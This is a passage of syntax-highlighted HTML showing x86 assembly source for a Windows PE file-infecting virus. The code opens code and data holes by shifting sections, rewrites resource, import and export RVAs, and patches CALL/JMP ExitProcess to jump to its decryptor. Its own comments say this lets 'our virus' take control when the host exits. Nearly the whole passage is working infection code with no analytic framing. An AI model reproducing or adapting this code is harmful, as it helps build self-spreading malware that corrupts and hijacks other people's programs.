                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">LastHeader</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RoundedSizeOfNewCode</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileSize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80000000h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Error</span><span class="sc0">              </span><span class="sc1">; If last header is writable, exit!</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; Set the physical and virtual</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Phys_DataHole</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc1">; addresses of the data hole</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_DataHole</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">; Set the new section sizes</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

      </span><span class="sc5">@@AllHolesPrepared</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">HeaderAddress</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Set the new image size of</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; the executable in the PE</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; header</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">50h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;; Let's patch ExitProcess:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ExitProcessAddress</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get the virtual address</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TextHeader</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; of the import table</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; where the function is.</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MappingAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">

      </span><span class="sc5">@@LoopFindExitProcess</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc1">; Search calls to that import</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; entry in the code of the</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">             </span><span class="sc1">; executable.</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@NextInstruction</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">25h</span><span class="sc0">        </span><span class="sc1">; Search for both CALL ExitProcess</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@JMPMemFound</span><span class="sc0">     </span><span class="sc1">; and JMP ExitProcess (normally used</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">15h</span><span class="sc0">        </span><span class="sc1">; by Microsoft's Visual Studio</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@NextInstruction</span><span class="sc0"> </span><span class="sc1">; compiler and Borland compiler</span><span class="sc0">
      </span><span class="sc5">@@JMPMemFound</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc1">; respectivelly).</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@NextInstruction</span><span class="sc0">
      </span><span class="sc1">;; ExitProcess found</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">           </span><span class="sc1">; Patch that call/jmp to point to the</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">              </span><span class="sc1">; code hole where the decryptor is.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">HeaderAddress</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; In this way, our virus gets</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">34h</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; the control when the exec</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_TextHole</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; exits.</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PatchExitProcess</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
      </span><span class="sc5">@@NextInstruction</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">; Continue the search.</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@LoopFindExitProcess</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; Return with no error.</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">PrepareFile</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; This function is the one that makes the code and data holes when we infect</span><span class="sc0">
</span><span class="sc1">;; by shifting down the sections of the executable.</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; ESI = Header of section where we make the hole at the end</span><span class="sc0">
</span><span class="sc1">;; ECX = Size of hole</span><span class="sc0">
</span><span class="sc5">UpdateHeaders</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc1">;; Things to do:</span><span class="sc0">
</span><span class="sc1">;; 1) Update all offsets &amp; code that point after the hole address using .reloc</span><span class="sc0">
</span><span class="sc1">;;   info</span><span class="sc0">
</span><span class="sc1">;; 2) Update virtual &amp; physical offsets that point after the hole address</span><span class="sc0">
</span><span class="sc1">;;   referenced at section headers</span><span class="sc0">
</span><span class="sc1">;; 3) Update directory addresses at PE header</span><span class="sc0">
</span><span class="sc1">;; 4) Update all RVA references at resources tree</span><span class="sc0">
</span><span class="sc1">;; 5) Update all RVA references under import and export structures</span><span class="sc0">
</span><span class="sc1">;; They are not performed in this order!</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                        </span><span class="sc1">; Get what hole we are </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MakingFirstHole</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; making (code or data hole)</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MakingDataHole</span><span class="sc0">      </span><span class="sc1">; If data hole, jump (put the hole</span><span class="sc0">
                                            </span><span class="sc1">; at the beginning of the section)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Fix the virtual size if it's smaller</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@TextSizeOK</span><span class="sc0">      </span><span class="sc1">; than the physical size.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc5">@@TextSizeOK</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; EDI = RVA of hole</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; EAX = Physical address of hole</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@BeginUpdates</span><span class="sc0">    </span><span class="sc1">; All OK to start</span><span class="sc0">
        </span><span class="sc5">@@MakingDataHole</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">; EDI = RVA of hole</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc5">@@BeginUpdates</span><span class="sc4">:</span><span class="sc0">

       </span><span class="sc1">; Let's update some headers</span><span class="sc0">
       </span><span class="sc1">; At this point:</span><span class="sc0">
       </span><span class="sc1">; ECX = Size of hole</span><span class="sc0">
       </span><span class="sc1">; ESI = Header of section containing the hole</span><span class="sc0">
       </span><span class="sc1">; EDI = RVA of hole</span><span class="sc0">
        </span><span class="sc5">@@UpdateResources</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">HeaderAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">88h</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; Get the physical address</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                   </span><span class="sc1">; of the resources</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@UpdateImports</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">TranslateVirtualToPhysical</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@End</span><span class="sc0">                        </span><span class="sc1">; Only virtual???</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get the number of resource entries</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFh</span><span class="sc0">       </span><span class="sc1">; in EDX</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">0Eh</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFh</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@UpdateImports</span><span class="sc0">

                </span><span class="sc1">; EBX = Address of root</span><span class="sc0">
                </span><span class="sc1">; EDX = Number of entries</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">          </span><span class="sc1">; Update all the resources offsets</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UpdateResourceDir</span><span class="sc0">

        </span><span class="sc5">@@UpdateImports</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UpdateImports</span><span class="sc0">     </span><span class="sc1">; Update the imports (using the</span><span class="sc0">
                                          </span><span class="sc1">; address of the hole at EDI and</span><span class="sc0">
                                          </span><span class="sc1">; the size at ECX)</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetModuleHandleAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                   </span><span class="sc1">; Check if the required</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@End</span><span class="sc0">                        </span><span class="sc1">; functions for a proper</span><span class="sc0">
</span><span class="sc1">;                 mov     eax, [ebp+VirtualAllocAddress] ; virus-work are</span><span class="sc0">
</span><span class="sc1">;                 or      eax, eax                       ; imported. If not,</span><span class="sc0">
</span><span class="sc1">;                 jz    @@End                            ; exit.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetProcAddressAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@End</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ExitProcessAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@End</span><span class="sc0">

        </span><span class="sc5">@@UpdateExports</span><span class="sc4">:</span><span class="sc0">                          </span><span class="sc1">; Get the address of the</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">HeaderAddress</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; exporting data (if exists)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">78h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                  </span><span class="sc1">; If there aren't exports,</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@ExportsUpdated</span><span class="sc0">            </span><span class="sc1">; update the next part</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">TranslateVirtualToPhysical</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                  </span><span class="sc1">; Next part if error</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@ExportsUpdated</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; If the offsets in the header</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">              </span><span class="sc1">; are situated AFTER the hole,</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@UpdateExportsOK_01</span><span class="sc0">    </span><span class="sc1">; then we add the hole size</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc5">@@UpdateExportsOK_01</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">1Ch</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UpdateArrayOfRVAs</span><span class="sc0">     </span><span class="sc1">; Update the RVAs in this array</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">1Ch</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Update the array RVA itself</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@UpdateExportsOK_02</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">1Ch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc5">@@UpdateExportsOK_02</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Update the RVAs in this array</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UpdateArrayOfRVAs</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Update the array RVA itself</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@UpdateExportsOK_03</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc5">@@UpdateExportsOK_03</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc5">@@ExportsUpdated</span><span class="sc4">:</span><span class="sc0">

